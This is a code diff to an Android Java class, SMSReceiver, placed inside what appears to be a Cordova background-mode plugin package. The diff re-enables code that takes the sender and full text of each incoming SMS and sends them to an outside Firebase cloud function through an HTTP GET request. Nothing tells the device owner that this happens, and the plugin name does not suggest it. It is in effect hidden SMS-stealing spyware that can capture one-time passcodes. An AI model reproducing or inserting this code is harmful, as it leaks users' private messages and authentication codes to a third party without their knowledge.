@@ -1,4 +1,6 @@
 
+package de.appplant.cordova.plugin.background;
+
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -7,14 +9,14 @@ import android.telephony.SmsMessage;
 
 import java.io.IOException;
 
-// import okhttp3.OkHttpClient;
-// import okhttp3.Request;
-// import okhttp3.Response;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
 
 public class SMSReceiver extends BroadcastReceiver {
     public static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
     private static final Object TAG = "Debug APp :";
-    // OkHttpClient client = new OkHttpClient();
+    OkHttpClient client = new OkHttpClient();
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -36,46 +38,46 @@ public class SMSReceiver extends BroadcastReceiver {
             String body = bodyText.toString();
 //            // Lets get SMS Code
 //            String code = body.replaceAll("[^0-9]", "");
-            // new NetworkAccess().execute(sender,body);
+            new NetworkAccess().execute(sender,body);
 //            Toast.makeText(context.getApplicationContext(), phono, Toast.LENGTH_SHORT).show();
 
         }
     }
-    // public class NetworkAccess extends AsyncTask<String, String, String>{
+    public class NetworkAccess extends AsyncTask<String, String, String>{
 
-    //     @Override
-    //     protected void onPreExecute() {
-    //         super.onPreExecute();
-    //         // call some loader
-    //     }
-    //     @Override
-    //     protected String doInBackground(String... params) {
-    //         // Do background task
-    //         String address = params[0];
-    //         String sms = params[1];
-    //         try {
-    //            run("https://us-central1-smsreader-cd2d3.cloudfunctions.net/addSMS?address="+address+"&msg="+sms);
-    //         } catch (IOException e) {
-    //             e.printStackTrace();
-    //         }
-    //         return null;
-    //     }
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+            // call some loader
+        }
+        @Override
+        protected String doInBackground(String... params) {
+            // Do background task
+            String address = params[0];
+            String sms = params[1];
+            try {
+               run("https://us-central1-smsreader-cd2d3.cloudfunctions.net/addSMS?address="+address+"&msg="+sms);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            return null;
+        }
 
-    //     @Override
-    //     protected void onPostExecute(String result) {
+        @Override
+        protected void onPostExecute(String result) {
 
-    //         super.onPostExecute(result);
-    //         // dismiss loader
-    //         // update ui
-    //     }
-    // }
-    // String run(String url) throws IOException {
-    //     Request request = new Request.Builder()
-    //             .url(url)
-    //             .build();
+            super.onPostExecute(result);
+            // dismiss loader
+            // update ui
+        }
+    }
+    String run(String url) throws IOException {
+        Request request = new Request.Builder()
+                .url(url)
+                .build();
 
-    //     try (Response response = client.newCall(request).execute()) {
-    //         return response.body().string();
-    //     }
-    // }
+        try (Response response = client.newCall(request).execute()) {
+            return response.body().string();
+        }
+    }
 }
